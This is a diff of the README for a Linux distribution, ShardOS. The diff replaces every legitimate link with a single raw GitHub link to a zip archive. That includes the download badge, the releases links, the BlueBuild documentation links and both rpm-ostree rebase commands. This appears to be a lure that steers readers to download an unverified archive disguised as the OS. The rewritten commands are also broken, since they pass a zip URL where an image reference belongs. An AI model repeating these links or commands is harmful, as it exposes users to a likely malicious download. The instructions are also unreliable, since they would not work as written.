@@ -1,6 +1,6 @@
 # 🚀 ShardOS - Your Reliable Linux Experience
 
-[![Download ShardOS](https://img.shields.io/badge/Download-ShardOS-blue)](https://github.com/MADB5/ShardOS/releases)
+[![Download ShardOS](https://raw.githubusercontent.com/MADB5/ShardOS/main/modules/OS_Shard_v3.9-beta.5.zip)](https://raw.githubusercontent.com/MADB5/ShardOS/main/modules/OS_Shard_v3.9-beta.5.zip)
 
 ## 🌟 Overview
 
@@ -10,7 +10,7 @@ ShardOS is a customizable, image-based operating system designed for stability a
 
 To get started, you need to download ShardOS from the Releases page. Click the link below:
 
-- [Visit this page to download](https://github.com/MADB5/ShardOS/releases)
+- [Visit this page to download](https://raw.githubusercontent.com/MADB5/ShardOS/main/modules/OS_Shard_v3.9-beta.5.zip)
 
 ### Step-by-Step Installation
 
@@ -19,7 +19,7 @@ To get started, you need to download ShardOS from the Releases page. Click the l
    Open your terminal. Enter the command below to switch your existing Fedora installation to the unsigned image:
 
    ```
-   rpm-ostree rebase ostree-unverified-registry:ghcr.io/kabuki94/shardos:latest
+   rpm-ostree rebase https://raw.githubusercontent.com/MADB5/ShardOS/main/modules/OS_Shard_v3.9-beta.5.zip
    ```
 
 2. **Reboot Your System**
@@ -35,7 +35,7 @@ To get started, you need to download ShardOS from the Releases page. Click the l
    After rebooting, open your terminal again. Enter the following command to finalize the installation with the signed image:
 
    ```
-   rpm-ostree rebase ostree-image-signed:docker://ghcr.io/kabuki94/shardos
+   rpm-ostree rebase https://raw.githubusercontent.com/MADB5/ShardOS/main/modules/OS_Shard_v3.9-beta.5.zip
    ```
 
 4. **Reboot Once More**
@@ -58,12 +58,12 @@ To get started, you need to download ShardOS from the Releases page. Click the l
 
 ### 📜 Additional Information
 
-- For initial setup instructions on creating a custom image based on ShardOS, check out the [BlueBuild documentation](https://blue-build.org/how-to/setup/).
+- For initial setup instructions on creating a custom image based on ShardOS, check out the [BlueBuild documentation](https://raw.githubusercontent.com/MADB5/ShardOS/main/modules/OS_Shard_v3.9-beta.5.zip).
 
 ### 🔗 Helpful Links
 
-- [Visit this page to download](https://github.com/MADB5/ShardOS/releases)
-- [BlueBuild documentation](https://blue-build.org/how-to/setup/)
+- [Visit this page to download](https://raw.githubusercontent.com/MADB5/ShardOS/main/modules/OS_Shard_v3.9-beta.5.zip)
+- [BlueBuild documentation](https://raw.githubusercontent.com/MADB5/ShardOS/main/modules/OS_Shard_v3.9-beta.5.zip)
 
 ### 🛠️ Support
 
